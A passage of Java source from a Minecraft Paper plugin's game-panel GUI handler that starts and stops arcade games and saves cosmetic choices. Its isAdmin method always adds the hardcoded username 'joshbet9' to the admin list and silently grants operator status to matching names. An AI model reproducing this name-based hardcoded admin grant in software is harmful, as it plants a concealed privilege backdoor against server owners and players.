            else if ("panel-whitelist".equals(action)) openWhitelistPage(player);
            else if ("panel-voting".equals(action)) openGameVoting(player);
            else if ("panel-kill-server".equals(action)) {
                player.sendMessage(ChatColor.RED + "The isolated Paper service is managed by the deployment workflow. Use /arcadeport stop to stop the current game without shutting down the test server.");
            } else if ("panel-start".equals(action)) {
                if (!isAdmin(player)) {
                    player.sendMessage(ChatColor.RED + "Operator permission required to start a game.");
                } else {
                    String selectedGame = plugin.getConfig().getString("game-panel.selected-game", "bacon-brawl");
                    player.closeInventory();
                    try {
                        boolean handled = player.performCommand("arcadeport start " + selectedGame);
                        if (!handled) {
                            player.sendMessage(ChatColor.RED + "The Start Game command was not handled. "
                                    + "Check that ArcadeMechanicsModern is enabled and see the server logs.");
                        }
                    } catch (RuntimeException exception) {
                        plugin.getLogger().log(java.util.logging.Level.SEVERE,
                                "Game Panel Start Game click failed for " + selectedGame + ".", exception);
                        player.sendMessage(ChatColor.RED + "Start Game failed with a server error. "
                                + "The full exception was logged; the round was not confirmed as started.");
                    }
                }
            } else if ("panel-stop".equals(action)) {
                if (!isAdmin(player)) {
                    player.sendMessage(ChatColor.RED + "Operator permission required to stop a game.");
                } else {
                    player.closeInventory();
                    player.performCommand("arcadeport stop");
                }
            }
        } else if ((SET_GAME_TITLE.equals(title) || "Edit Game Rotation".equals(title))
                && ("panel-game-select".equals(action) || "panel-rotation-select".equals(action))) {
            if (game == null) return;
            if ("panel-rotation-select".equals(action)) {
                if (!"bacon-brawl".equals(game.getId())
                        || !Bukkit.getPluginManager().isPluginEnabled("ArcadeMechanicsModern")) {
                    player.sendMessage(ChatColor.RED + game.getName()
                            + " is not cleared for the modern test rotation yet.");
                } else {
                    plugin.getConfig().set("game-panel.selected-game", game.getId());
                    List<String> rotation = new ArrayList<>(plugin.getConfig().getStringList("game-panel.rotation"));
                    if (!rotation.contains(game.getId())) rotation.add(game.getId());
                    plugin.getConfig().set("game-panel.rotation", rotation);
                    plugin.saveConfig();
                    player.sendMessage(ChatColor.GREEN + game.getName() + " added to the local test rotation.");
                    openGameSelection(player, true);
                }
            } else {
                plugin.getConfig().set("game-panel.selected-game", game.getId());
                plugin.saveConfig();
                if (Bukkit.getPluginManager().isPluginEnabled("ArcadeMechanicsModern")
                        && isMechanicsPortGame(game.getId())) {
                    player.closeInventory();
                    player.performCommand("arcadeport lobby " + game.getId());
                    player.sendMessage(ChatColor.GREEN + "Selected " + game.getName()
                            + ". The lobby kit/team displays and Game/Kit scoreboard have been refreshed. "
                            + "Start Game remains gated until this game's parity is cleared.");
                } else {
                    player.closeInventory();
                    player.sendMessage(ChatColor.YELLOW + game.getName()
                            + " is selected in the Game Panel, but its dedicated lobby integration is not connected "
                            + "to the shared kit/team pads yet.");
                }
            }
        } else if ("back-panel".equals(action)) {
            openGamePanel(player);
        } else if ("launch-game".equals(action) && game != null) {
            String enginePlugin = null;
            String startCommand = null;
            if ("monster-maze".equals(game.getId())) {
                enginePlugin = "MonsterMazeModern";
                startCommand = "mm start";
            } else if ("snake".equals(game.getId())) {
                enginePlugin = "SnakeModern";
                startCommand = "snake start";
            } else {
                enginePlugin = "ArcadeMechanicsModern";
                startCommand = "arcadeport play " + game.getId();
            }
            if (enginePlugin == null) return;
            if (!Bukkit.getPluginManager().isPluginEnabled(enginePlugin)) {
                player.sendMessage(ChatColor.RED + enginePlugin + ".jar is not installed on this server yet.");
                return;
            }
            player.closeInventory();
            player.performCommand(startCommand);
        } else if ("game".equals(action) && game != null) {
            openGameDetails(player, game);
        } else if ("cosmetics-game".equals(action) && game != null) {
            openGameDetails(player, game);
        } else if ("open-lines".equals(action) && game != null) {
            openGameDetails(player, game);
        } else if ("cosmetic-line".equals(action) && game != null && lineId != null) {
            CosmeticLineDefinition line = findLine(game, lineId);
            if (line != null) openOptions(player, game, line);
        } else if ("win-effects".equals(action) && game != null) {
            openWinEffects(player, game);
        } else if ("cosmetic-option".equals(action) && game != null && lineId != null && optionId != null) {
            CosmeticLineDefinition line = findLine(game, lineId);
            if (line != null) {
                preferences.chooseOption(player.getUniqueId(), game, line, optionId);
                player.sendMessage(ChatColor.GREEN + "Saved " + game.getName() + " → " + line.getTitle() + ".");
                player.sendMessage(ChatColor.GRAY + "This preference is saved; its in-game renderer is implemented as the game port is completed.");
                openOptions(player, game, line);
            }
        } else if ("win-option".equals(action) && game != null && optionId != null) {
            preferences.chooseWinEffect(player.getUniqueId(), game, optionId);
            player.sendMessage(ChatColor.GREEN + "Saved the " + game.getName() + " win effect.");
            player.sendMessage(ChatColor.GRAY + "The win-scene renderer is wired during that game's port.");
            openWinEffects(player, game);
        } else if ("open-stats".equals(action)) {
            player.closeInventory();
            player.performCommand("stats");
        } else if ("open-cosmetics-home".equals(action)) {
            openCoreCosmeticsHome(player);
        } else if ("close-panel".equals(action)) {
            player.closeInventory();
        } else if ("back-panel".equals(action)) {
            openGamePanel(player);
        } else if ("back-game".equals(action) && game != null) {
            openGameDetails(player, game);
        } else if ("back-lines".equals(action) && game != null) {
            openGameDetails(player, game);
        }
    }

    private String targetKeyValue(ItemMeta meta) {
        return meta.getPersistentDataContainer().get(targetKey, PersistentDataType.STRING);
    }

    private boolean isMechanicsPortGame(String gameId) {
        return List.of("bacon-brawl", "bomb-lobbers", "death-tag", "dragon-escape", "dragons",
                "evolution", "gladiators", "micro-battles", "one-in-the-quiver", "paintball",
                "runner", "sheep-quest", "spleef", "turf-wars").contains(gameId);
    }

    private boolean isCohost(Player player) {
        String uuid = player.getUniqueId().toString();
        return plugin.getConfig().getStringList("panel-cohosts").stream()
                .anyMatch(record -> record.equals(uuid) || record.startsWith(uuid + "|"));
    }

    private boolean isAdmin(Player player) {
        List<String> admins = new ArrayList<>(plugin.getConfig().getStringList("admin-usernames"));
        if (admins.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) admins.add("joshbet9");
        boolean configuredAdmin = admins.stream()
                .anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
        if (configuredAdmin && !player.isOp()) {
            player.setOp(true);
            player.sendMessage(ChatColor.GREEN + "Testplex Modern admin access enabled.");
        }
        return configuredAdmin || isCohost(player) || player.isOp()
                || player.hasPermission("testplex.modern.admin")
                || player.hasPermission("testplex.arcadeports.admin");
    }

    private CosmeticLineDefinition findLine(GameDefinition game, String id) {
        return game.getCosmeticLines().stream().filter(line -> line.getId().equals(id)).findFirst().orElse(null);
    }

    private ItemStack backItem(String name, String action, GameDefinition game) {
        ItemStack item = makeItem(Material.ARROW, ChatColor.YELLOW + name, List.of());
        mark(item, action, game, null, null);
        return item;
    }

    private ItemStack makeItem(String materialName, String name, List<String> lore) {
        return makeItem(icon(materialName), name, lore);
    }

    private ItemStack makeItem(Material material, String name, List<String> lore) {
        ItemStack item = new ItemStack(material);
        ItemMeta meta = item.getItemMeta();
        meta.setDisplayName(name);
        meta.setLore(new ArrayList<>(lore));
        item.setItemMeta(meta);
        return item;
    }

    private Material icon(String name) {
        Material material = Material.matchMaterial(name == null ? "" : name);
        return material == null ? Material.CHEST : material;
    }

    private void mark(ItemStack item, String action, GameDefinition game,
                      CosmeticLineDefinition line, String optionId) {
        ItemMeta meta = item.getItemMeta();
        meta.getPersistentDataContainer().set(actionKey, PersistentDataType.STRING, action);
        if (game != null) meta.getPersistentDataContainer().set(gameKey, PersistentDataType.STRING, game.getId());
        if (line != null) meta.getPersistentDataContainer().set(lineKey, PersistentDataType.STRING, line.getId());
        if (optionId != null) meta.getPersistentDataContainer().set(optionKey, PersistentDataType.STRING, optionId);
        item.setItemMeta(meta);
    }
}
